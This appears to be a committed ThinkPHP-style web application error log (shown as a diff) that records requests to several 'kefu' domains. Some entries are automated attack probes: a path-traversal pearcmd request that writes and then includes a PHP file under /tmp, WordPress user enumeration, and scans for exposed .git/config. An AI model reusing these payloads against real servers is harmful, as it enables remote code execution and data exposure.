@@ -1,0 +1,69 @@
+---------------------------------------------------------------
+[ 2024-06-18T03:33:26+08:00 ] 182.43.250.133 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T03:33:26+08:00 ] 182.43.250.133 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T05:28:29+08:00 ] 20.200.122.70 POST kefu1adgasgdhjagsj.online/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T05:28:33+08:00 ] 20.200.122.70 POST kefu2sjggcjxbcxmbha.online/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T12:53:40+08:00 ] 178.128.207.138 GET kefu12shdajgsdjhagjkh.online/?rest_route=/wp/v2/users/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T12:53:53+08:00 ] 206.189.225.181 GET kefu12shdajgsdjhagjkh.site/?rest_route=/wp/v2/users/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T13:11:45+08:00 ] 69.171.251.3 GET kefu12shdajgsdjhagjkh.site/?fbclid=IwZXh0bgNhZW0CMTEAAR27h_sh2Mu2LgIhrllGMvzI-jpTqqwEayWQFaawjCjKHeQiYqEDzwdRbRI_aem_V6VVOLO9FuJMKv1uBDKNfA
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T13:12:17+08:00 ] 173.252.127.115 GET kefu12shdajgsdjhagjkh.online/?fbclid=IwZXh0bgNhZW0CMTEAAR1Hq2wU10HLYmmZ1Ydkd3M0VPryOcoKzlQ7O03xlhQXa546pbyOcw2UphI_aem_8MP_eV3TL9JDrIPKfQKtow
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T14:17:24+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/user/v1/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-18T14:17:24+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/.git/config
+[ error ] controller not exists:.git
+---------------------------------------------------------------
+[ 2024-06-18T14:17:24+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/admin/v2/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-18T14:17:24+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/admin/v1/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-18T14:17:24+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/admin/v4/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-18T14:17:24+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/admin/v3/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/user/v4/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/user/v3/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/v3/.git/config
+[ error ] controller not exists:app\api\controller\V3
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/user/v2/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/v1/.git/config
+[ error ] controller not exists:app\api\controller\V1
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/v4/.git/config
+[ error ] controller not exists:app\api\controller\V4
+---------------------------------------------------------------
+[ 2024-06-18T14:17:25+08:00 ] 193.143.1.119 GET kefu8sashjkahskjhakjsh.shop/api/v2/.git/config
+[ error ] controller not exists:app\api\controller\V2
+---------------------------------------------------------------
+[ 2024-06-18T22:31:50+08:00 ] 23.247.130.85 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-18T22:31:52+08:00 ] 23.247.130.85 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
